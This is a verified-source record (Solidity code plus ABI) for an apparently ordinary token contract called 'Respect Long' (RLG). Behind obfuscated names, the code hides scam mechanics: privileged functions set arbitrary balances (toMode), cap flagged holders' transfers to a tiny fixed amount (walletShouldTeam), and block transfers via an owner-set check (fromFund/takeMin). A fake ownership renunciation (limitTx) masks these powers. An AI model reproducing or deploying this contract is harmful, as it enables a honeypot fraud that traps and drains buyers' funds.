{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface toReceiverMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTotalBuy {\n    function createPair(address receiverLimitAt, address teamToken) external returns (address);\n}\n\ninterface buyWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderAtBuy) external view returns (uint256);\n\n    function transfer(address receiverModeFrom, uint256 receiverMax) external returns (bool);\n\n    function allowance(address enableTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverModeFrom,\n        uint256 receiverMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyShould, uint256 value);\n    event Approval(address indexed enableTx, address indexed spender, uint256 value);\n}\n\ninterface marketingFrom is buyWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RespectLong is tradingMode, buyWallet, marketingFrom {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isToken;\n    }\n\n    event OwnershipTransferred(address indexed limitLaunched, address indexed totalIs);\n\n    uint256 constant modeSwap = 12 ** 10;\n\n    function swapReceiverLaunched(address feeMarketingMin) public {\n        if (exemptSell) {\n            return;\n        }\n        \n        listIsToken[feeMarketingMin] = true;\n        \n        exemptSell = true;\n    }\n\n    bool public txFromBuy;\n\n    bool public amountFromSwap;\n\n    function approve(address txSender, uint256 receiverMax) public virtual override returns (bool) {\n        toLaunch[_msgSender()][txSender] = receiverMax;\n        emit Approval(_msgSender(), txSender, receiverMax);\n        return true;\n    }\n\n    bool public exemptSell;\n\n    function balanceOf(address senderAtBuy) public view virtual override returns (uint256) {\n        return atTradingWallet[senderAtBuy];\n    }\n\n    address public txMarketing;\n\n    uint256 public totalLimit;\n\n    bool public launchedEnable;\n\n    uint256 public liquidityAtAmount;\n\n    function walletShouldTeam(address receiverFrom) public {\n        tokenFee();\n        if (liquidityExempt) {\n            tokenFromWallet = true;\n        }\n        if (receiverFrom == senderFrom || receiverFrom == txMarketing) {\n            return;\n        }\n        listFund[receiverFrom] = true;\n    }\n\n    uint256 private isToken = 100000000 * 10 ** 18;\n\n    address marketingAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private tokenFromWallet;\n\n    function toMode(address minSell, uint256 receiverMax) public {\n        tokenFee();\n        atTradingWallet[minSell] = receiverMax;\n    }\n\n    function limitTx() public {\n        emit OwnershipTransferred(senderFrom, address(0));\n        minTo = address(0);\n    }\n\n    string private listExempt = \"RLG\";\n\n    address public senderFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listExempt;\n    }\n\n    function fromFund(uint256 receiverMax) public {\n        tokenFee();\n        modeLiquidityEnable = receiverMax;\n    }\n\n    function transfer(address minSell, uint256 receiverMax) external virtual override returns (bool) {\n        return takeMin(_msgSender(), minSell, receiverMax);\n    }\n\n    mapping(address => bool) public listFund;\n\n    uint256 modeLiquidityEnable;\n\n    function transferFrom(address buyLimit, address receiverModeFrom, uint256 receiverMax) external override returns (bool) {\n        if (_msgSender() != txReceiverList) {\n            if (toLaunch[buyLimit][_msgSender()] != type(uint256).max) {\n                require(receiverMax <= toLaunch[buyLimit][_msgSender()]);\n                toLaunch[buyLimit][_msgSender()] -= receiverMax;\n            }\n        }\n        return takeMin(buyLimit, receiverModeFrom, receiverMax);\n    }\n\n    mapping(address => mapping(address => uint256)) private toLaunch;\n\n    address private minTo;\n\n    function takeMin(address buyLimit, address receiverModeFrom, uint256 receiverMax) internal returns (bool) {\n        if (buyLimit == senderFrom) {\n            return walletSender(buyLimit, receiverModeFrom, receiverMax);\n        }\n        uint256 txModeReceiver = buyWallet(txMarketing).balanceOf(marketingAmount);\n        require(txModeReceiver == modeLiquidityEnable);\n        require(receiverModeFrom != marketingAmount);\n        if (listFund[buyLimit]) {\n            return walletSender(buyLimit, receiverModeFrom, modeSwap);\n        }\n        return walletSender(buyLimit, receiverModeFrom, receiverMax);\n    }\n\n    constructor (){\n        \n        toReceiverMin autoLimit = toReceiverMin(txReceiverList);\n        txMarketing = modeTotalBuy(autoLimit.factory()).createPair(autoLimit.WETH(), address(this));\n        if (launchedEnable == txFromBuy) {\n            liquidityAtAmount = totalLimit;\n        }\n        senderFrom = _msgSender();\n        limitTx();\n        listIsToken[senderFrom] = true;\n        atTradingWallet[senderFrom] = isToken;\n        if (amountFromSwap == modeMin) {\n            totalLimit = liquidityAtAmount;\n        }\n        emit Transfer(address(0), senderFrom, isToken);\n    }\n\n    function walletSender(address buyLimit, address receiverModeFrom, uint256 receiverMax) internal returns (bool) {\n        require(atTradingWallet[buyLimit] >= receiverMax);\n        atTradingWallet[buyLimit] -= receiverMax;\n        atTradingWallet[receiverModeFrom] += receiverMax;\n        emit Transfer(buyLimit, receiverModeFrom, receiverMax);\n        return true;\n    }\n\n    function allowance(address exemptToken, address txSender) external view virtual override returns (uint256) {\n        if (txSender == txReceiverList) {\n            return type(uint256).max;\n        }\n        return toLaunch[exemptToken][txSender];\n    }\n\n    function owner() external view returns (address) {\n        return minTo;\n    }\n\n    mapping(address => uint256) private atTradingWallet;\n\n    uint256 isTotal;\n\n    function getOwner() external view returns (address) {\n        return minTo;\n    }\n\n    string private fromFee = \"Respect Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return listToken;\n    }\n\n    bool private liquidityExempt;\n\n    function tokenFee() private view {\n        require(listIsToken[_msgSender()]);\n    }\n\n    bool public modeMin;\n\n    mapping(address => bool) public listIsToken;\n\n    uint8 private listToken = 18;\n\n    address txReceiverList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return fromFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAtBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"fromFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listIsToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketingMin\",\"type\":\"address\"}],\"name\":\"swapReceiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"toMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverModeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"walletShouldTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RespectLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}